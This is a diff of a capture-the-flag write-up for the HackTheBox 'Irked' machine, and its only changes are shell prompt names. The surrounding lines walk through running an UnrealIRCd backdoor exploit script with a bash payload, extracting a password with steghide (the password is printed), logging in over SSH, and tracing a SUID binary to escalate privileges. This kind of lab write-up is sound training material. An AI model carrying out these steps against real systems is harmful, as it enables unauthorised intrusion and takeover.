@@ -66,7 +66,7 @@ oh yea wrong port... `irked.htb/6697`
 ```
 okey we got our version.. let search on `searchsploit`
 ```
-kali@kali:~/HTB$ searchsploit UnrealIRCd
+bibo318@parrot:~/HTB$ searchsploit UnrealIRCd
 --------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                       |  Path
 --------------------------------------------------------------------- ---------------------------------
@@ -80,7 +80,7 @@ so I google a bit more, I found that this vuln is **CVE-2010-2075** and looking 
 
 dot forget to change local ip + port in the script.
 ```console
-kali@kali:/opt$ sudo python3 unrealIRC.py -h
+bibo318@parrot:/opt$ sudo python3 unrealIRC.py -h
 usage: unrealIRC.py [-h] -payload {python,netcat,bash} ip port
 
 positional arguments:
@@ -91,7 +91,7 @@ optional arguments:
   -h, --help            show this help message and exit
   -payload {python,netcat,bash}
                         set payload type
-kali@kali:/opt$ sudo python3 unrealIRC.py irked.htb 6697 -payload bash
+bibo318@parrot:/opt$ sudo python3 unrealIRC.py irked.htb 6697 -payload bash
 Exploit sent successfully!
 ```
 and it works, he deserve some star on his github!!
@@ -149,16 +149,16 @@ Super elite steg backup pw
 ```
 steg..... hmmm... steganography? but where is the pictures? I check `djmardov/Pictures` but is empty... after few minutes later, I remember that there is a picture on web page, a smily or something. let download it and use steghide find out what djmardov is hidding.
 ```console
-kali@kali:~/HTB/irked.htb$ steghide --help
-kali@kali:~/HTB/irked.htb$ steghide extract -sf irked.jpg 
+bibo318@parrot:~/HTB/irked.htb$ steghide --help
+bibo318@parrot:~/HTB/irked.htb$ steghide extract -sf irked.jpg 
 Enter passphrase: 
 wrote extracted data to "pass.txt".
-kali@kali:~/HTB/irked.htb$ cat pass.txt 
+bibo318@parrot:~/HTB/irked.htb$ cat pass.txt 
 Kab6h+m+bbp2J:HG
 ```
 now let SSH as `djmardov` !!
 ```
-kali@kali:/opt$ ssh djmardov@irked.htb
+bibo318@parrot:/opt$ ssh djmardov@irked.htb
 djmardov@irked.htb's password: 
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -189,11 +189,11 @@ It is still being actively developed
 ```
 I ran linpeas.sh, nothing really interesting so let go back to `viewuser`. `scp` and copy it to our kali to examing it more
 ```
-kali@kali:~/HTB/irked.htb$ scp djmardov@irked.htb:/home/djmardov/viewuser viewuser
+bibo318@parrot:~/HTB/irked.htb$ scp djmardov@irked.htb:/home/djmardov/viewuser viewuser
 ```
 since it is binary, let us `ltrace` to debuging it
 ```
-kali@kali:~/HTB/irked.htb$ ltrace ./viewuser 
+bibo318@parrot:~/HTB/irked.htb$ ltrace ./viewuser 
 <... system resumed> )                                         = 0
 setuid(0)                                                      = -1
 system("/tmp/listusers"sh: 1: /tmp/listusers: not found
